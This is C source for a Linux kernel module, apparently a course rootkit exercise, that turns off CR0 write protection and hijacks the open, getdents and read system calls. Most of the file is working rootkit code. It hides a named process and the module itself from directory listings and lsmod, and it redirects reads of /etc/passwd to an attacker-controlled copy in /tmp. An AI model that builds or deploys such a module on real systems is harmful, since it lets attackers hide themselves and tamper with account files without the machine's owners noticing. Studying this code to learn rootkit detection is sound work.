#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
//#include <string.h>
//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))
#define BUFFLEN 1024
struct linux_dirent {
  u64 d_ino;
  s64 d_off;
  unsigned short d_reclen;
  char d_name[BUFFLEN];
};
static char *sneaky_process_id = "default";
module_param(sneaky_process_id, charp, 0);

//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81072040;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;

int enter_lsmod=0;
//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
//asmlinkage int (*original_call)(const char *pathname, int flags);
asmlinkage int (*myopen)(const char *pathname, int flags,mode_t mode);
asmlinkage int (*mygetdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage ssize_t (*myread)(int fd, void *buf, size_t count);
//Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags,mode_t mode)
{
  //printk(KERN_INFO "Very, very Sneaky!\n");
  const char *src_file = "/tmp/passwd";
  if(strcmp(pathname, "/etc/passwd") == 0){
    copy_to_user((void*)pathname, src_file, 12);//size of length
  }
  if (strcmp(pathname, "/proc/modules") == 0){
    enter_lsmod=1;
  }
  return myopen(pathname, flags,mode);
}
/*
struct linux_dirent {
  u64 d_ino;
  s64 d_off;
  unsigned short d_reclen;
  char d_name[BUFFLEN];
};
*/

asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
  int number_bytes = mygetdents(fd, dirp, count);
  int ans=number_bytes;//return val
  struct linux_dirent *cur = dirp;
  int cur_bytes=0;
  for(;cur_bytes<number_bytes;){
    void *next=(void *)cur+cur->d_reclen;//get next address
    if(strcmp(cur->d_name,"sneaky_process")==0||strcmp(cur->d_name, sneaky_process_id) == 0){
      void *cur_add=(void *)cur;
      size_t len=(size_t)number_bytes-(size_t)cur_bytes-(size_t)cur->d_reclen;
      memmove(cur_add,next,len);
      ans-=cur->d_reclen;
      cur_bytes+=cur->d_reclen;
      continue;
    }
    cur_bytes+=cur->d_reclen;
    cur=(struct linux_dirent*)next;
  }
  return ans;
}

asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
  ssize_t ans=myread(fd,buf,count);
  char * left=NULL;
  char *right=NULL;
  ssize_t size_of_target=0;
  ssize_t move_size=0;
  if(ans==0||enter_lsmod==0) return ans; //no input or not enter lsmod
  left= strstr(buf,"sneaky_mod");
  if(left==NULL) return ans;// no sneaky_mod inside
  right=left;
  while(*right!='\n'){
    right++;
    size_of_target++;
  }
  move_size=ans-(ssize_t)((void *)left-buf)-size_of_target-1;
  ans-=size_of_target+1;
  right++;
  memmove(left,right,move_size);
  enter_lsmod=1;
  return ans;
}

//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.
  // original_call = (void*)*(sys_call_table + __NR_open);
  //*(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;



  mygetdents = (void*)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;

 myopen = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;

  myread = (void*)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  struct page *page_ptr;

  //printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  //*(sys_call_table + __NR_open) = (unsigned long)original_call;
  *(sys_call_table + __NR_open) = (unsigned long)myopen;
  *(sys_call_table + __NR_getdents) = (unsigned long)mygetdents;
  *(sys_call_table + __NR_read) = (unsigned long)myread; 
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("Dual MIT/GPL");
